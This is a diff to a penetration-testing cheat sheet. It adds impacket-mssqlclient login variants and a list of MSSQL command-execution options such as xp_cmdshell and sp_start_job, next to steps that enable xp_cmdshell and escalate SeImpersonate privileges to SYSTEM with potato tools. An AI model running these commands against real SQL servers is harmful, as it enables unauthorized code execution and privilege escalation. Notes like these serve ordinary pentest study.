@@ -186,12 +186,21 @@ Get-SQLQuery -Verbose -Instance "<SQL-SERVER-IP>,1433" -username "<DOMAIN>\<USER
 ```
 #### Connect to MSSQL From Linux
 ```bash
-impacket-mssqlclient <DOMAIN>/<USER-2>@<SQL-SERVER-IP> -windows-auth
+# use the domain to auth 
+impacket-mssqlclient <DOMAIN>/<USER-2>@<SQL-SERVER-IP> -windows-auth 
+
+# use the sql service to auth
+impacket-mssqlclient <DOMAIN>/<USER-2>@<SQL-SERVER-IP> 
+
 enable_xp_cmdshell
 # xp_cmdshell <command>.
 xp_cmdshell whoami /priv    # check the MSSQL Account priv on the server
   # SeAssignPrimaryTokenPrivilege 
   # SeImpersonatePrivilege   
+  
+     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+     ! {cmd}                    - executes a local shell cmd  
 ```
 [+] ==find `SeImpersonate and SeAssignPrimaryToken` so we can  escalate to `SYSTEM` level privileges (using tools such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato))==
 
